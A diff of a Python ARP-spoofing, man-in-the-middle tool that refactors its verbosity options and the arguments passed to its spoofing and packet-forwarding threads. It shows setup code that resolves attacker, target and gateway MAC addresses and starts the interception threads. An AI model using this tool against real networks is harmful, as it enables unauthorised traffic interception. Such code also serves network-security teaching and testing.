@@ -11,7 +11,6 @@ DEFAULT_DURATION  = 45
 DEFAULT_TIMEOUT   = 4
 DEFAULT_INTERVAL  = 0.1
 DEFAULT_VERBOSE   = False
-DEFAULT_VERBOSER  = False
 
 try:
 	# Check that all the requirements are met before any computations.
@@ -26,8 +25,7 @@ try:
 		"Duration":  DEFAULT_DURATION,
 		"Timeout":   DEFAULT_TIMEOUT,
 		"Interval":  DEFAULT_INTERVAL,
-		"Verbose":   DEFAULT_VERBOSE,
-		"Verboser":  DEFAULT_VERBOSER
+		"Verbose":   DEFAULT_VERBOSE
 	}
 
 	PopulateFields(functional_parameters)
@@ -43,9 +41,9 @@ try:
 		PrintMessage("There was an error whilst verifying the state of the provided addresses. Please ensure that the source, gateway and attacker addresses are provided.")
 
 	# Discover the required MAC addresses for true network functionality.
-	attacker_mac  = get_if_hwaddr(functional_parameters["Interface"])
-	target_mac    = GetMAC(functional_parameters["Target"], functional_parameters["Timeout"], functional_parameters["Interface"])
-	gateway_mac   = GetMAC(functional_parameters["Gateway"], functional_parameters["Timeout"], functional_parameters["Interface"])
+	attacker_mac = get_if_hwaddr(functional_parameters["Interface"])
+	target_mac   = GetMAC(functional_parameters["Target"],  functional_parameters["Timeout"])
+	gateway_mac  = GetMAC(functional_parameters["Gateway"], functional_parameters["Timeout"])
 	PrintMessage(f"(Attacker) {attacker_mac} (Target) {target_mac} (Gateway) {gateway_mac}", 0)
 
 	mac_fields = [
@@ -59,7 +57,7 @@ try:
 
 	# Establish multi-threading behaviours for efficient network traversal for each incoming and outgoing packet.
 	spoof_thread = threading.Thread(target=Spoof, args=(
-		functional_parameters["Verboser"],
+		functional_parameters["Verbose"],
 		functional_parameters["Interval"],
 		functional_parameters["Gateway"],
 		gateway_mac,
@@ -68,8 +66,8 @@ try:
 		attacker_mac
 	))
 
-	sending_thread   = threading.Thread(target=ForwardSent,     args=(functional_parameters["Verbose"], functional_parameters["Target"], functional_parameters["Interface"]))
-	receiving_thread = threading.Thread(target=ForwardReceived, args=(functional_parameters["Verbose"], functional_parameters["Target"], functional_parameters["Interface"]))
+	sending_thread   = threading.Thread(target=ForwardSent,     args=(functional_parameters["Target"], functional_parameters["Interface"]))
+	receiving_thread = threading.Thread(target=ForwardReceived, args=(functional_parameters["Target"], functional_parameters["Interface"]))
 
 	spoof_thread.start()
 	sending_thread.start()
